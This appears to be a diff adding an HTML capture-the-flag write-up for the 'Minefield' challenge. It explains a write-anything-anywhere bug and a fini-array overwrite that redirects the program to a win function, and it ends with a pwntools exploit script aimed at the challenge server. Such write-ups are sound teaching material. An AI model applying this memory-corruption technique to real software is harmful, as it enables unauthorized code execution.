@@ -1,0 +1,100 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Minefield</h1>
+            <h2>April 2021</h2>
+            <h3>Fini Array Overwrite</h3>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+       We found one of the core power plants that drain all of our resources. One member of our team is an expert at mines. Plant the correct type of mine at the correct location to blow up the entire power plant, but be careful, otherwise we are all doomed! <a href=../../docs/cyber_apocalypse/minefield>System dROP</a>
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br>
+    	This binary has a couple of functions, however only 2 of them are really relevant to us. The mission function reads in 2 values. The first value is assigned to a local variable. The second variable however is assigned to the location that the first variable points to. This is very interesting for us since we can determine both the location to write to, and what is written. This gives us a "write anything anywhere" vulnerability. 
+        <br> 
+        The second function is a win function that prints out the flag for us when called. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/minefield1.png" alt="">
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/minefield2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Unfortunately no more functions are called after the second value is read in, so overwriting got entries is not an option in this case. However, the binary has been compiled with no relro and no pie, so we can instead overwrite the fini array with the address of the win function.
+        <br>
+        We can retrieve the address of the fini array with the command below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/minefield3.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        We no have everything we need to execute our exploit and get the flag. The exploit script is posted below.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/minefield4.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+from pwn import *
+
+elf = context.binary = ELF('./minefield')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '139.59.174.238'
+    port = 32093
+    p = remote(host,port)
+
+control = '6295672' #dec value of fini array
+win = '4196715'     #dec value of win function
+
+p.clean()
+p.sendline('2')
+log.info(p.readuntil('Insert type of mine: '))
+p.sendline(control)                    
+log.info(p.readuntil('Insert location to plant: '))
+p.sendline(win)                 
+log.info(p.clean())
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
